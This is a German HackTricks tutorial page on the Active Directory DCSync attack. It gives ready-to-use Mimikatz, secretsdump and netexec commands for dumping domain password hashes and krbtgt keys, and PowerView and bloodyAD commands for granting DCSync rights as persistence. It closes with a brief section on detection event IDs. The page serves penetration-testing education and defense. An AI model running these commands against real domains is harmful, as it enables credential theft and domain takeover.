# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync**-Berechtigung setzt voraus, dass über die Domäne selbst folgende Berechtigungen vorhanden sind: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Wichtige Hinweise zu DCSync:**

- Der **DCSync-Angriff simuliert das Verhalten eines Domain Controllers und fordert andere Domain Controller mithilfe des Directory Replication Service Remote Protocol (MS-DRSR) zur Replikation von Informationen auf**. Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann es nicht abgeschaltet oder deaktiviert werden.
- Standardmäßig verfügen nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** über die erforderlichen Berechtigungen.
- In der Praxis benötigt **vollständiges DCSync** **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** im Domain Naming Context. `DS-Replication-Get-Changes-In-Filtered-Set` wird häufig zusammen mit diesen Berechtigungen delegiert, ist allein jedoch eher für die Synchronisierung von **vertraulichen / RODC-gefilterten Attributen** relevant (zum Beispiel Secrets im Stil von Legacy-LAPS) als für einen vollständigen krbtgt-Dump.<sup>[[2]](#references)</sup>
- Wenn Passwörter von Konten mit umkehrbarer Verschlüsselung gespeichert werden, bietet Mimikatz eine Option, das Passwort im Klartext zurückzugeben.

### Enumeration

Prüfe mit `powerview`, wer über diese Berechtigungen verfügt:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Wenn du dich auf **non-default principals** mit DCSync-Rechten konzentrieren möchtest, filtere die integrierten, zur Replikation berechtigten Gruppen heraus und überprüfe nur unerwartete Trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Lokal exploiten
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Remote exploiten
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktische Beispiele mit begrenztem Umfang:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync mit einem erbeuteten Maschinen-TGT eines DC (ccache)

In Szenarien mit unconstrained-delegation im export-mode kann ein Maschinen-TGT eines Domain Controllers erbeutet werden (z. B. `DC1$@DOMAIN` für `krbtgt@DOMAIN`). Anschließend kann dieser ccache verwendet werden, um sich als DC zu authentifizieren und ohne Passwort einen DCSync durchzuführen.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Betriebsnotizen:

- **Impacket's Kerberos path touches SMB first** before the DRSUAPI call. If the environment enforces **SPN target name validation**, a full dump may fail with `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In diesem Fall können Sie entweder zuerst ein **`cifs/<dc>`**-Service-Ticket für den Ziel-DC anfordern oder für den Account, den Sie sofort benötigen, auf **`-just-dc-user`** zurückgreifen.
- Wenn Sie nur über geringere Replikationsrechte verfügen, kann eine LDAP/DirSync-style Synchronisierung weiterhin **confidential** oder **RODC-filtered** Attribute offenlegen, zum Beispiel das veraltete `ms-Mcs-AdmPwd`, ohne eine vollständige krbtgt-Replikation.<sup>[[2]](#references)</sup>

`-just-dc` generiert 3 Dateien:

- eine mit den **NTLM hashes**
- eine mit den **Kerberos keys**
- eine mit Klartextpasswörtern aus der NTDS für alle Accounts, bei denen [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Benutzer mit reversible encryption können Sie folgendermaßen abrufen:

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistenz

Wenn Sie Domain Admin sind, können Sie jedem Benutzer mithilfe von `powerview` diese Berechtigungen gewähren:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux-Operatoren können dasselbe mit `bloodyAD` tun:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Dann kannst du **überprüfen, ob dem Benutzer die 3 Berechtigungen korrekt zugewiesen wurden**, indem du in der Ausgabe von danach suchst (du solltest die Namen der Berechtigungen im Feld „ObjectType“ sehen können):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Maßnahmen

- Sicherheitsereignis-ID 4662 (Überwachungsrichtlinie für Objekte muss aktiviert sein) – Ein Vorgang wurde für ein Objekt ausgeführt<sup>[[4]](#references)</sup>
- Sicherheitsereignis-ID 5136 (Überwachungsrichtlinie für Objekte muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
- Sicherheitsereignis-ID 4670 (Überwachungsrichtlinie für Objekte muss aktiviert sein) – Berechtigungen für ein Objekt wurden geändert
- AD ACL Scanner – ACLs erstellen und Vergleichsberichte erstellen. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referenzen

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replikation mit Get-Changes und Get-Changes-In-Filtered-Set nutzen](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Passwort-Hashes vom Domain Controller auslesen](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL-Credentials → gezieltes Kerberoast → Unconstrained Delegation → DCSync zu DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
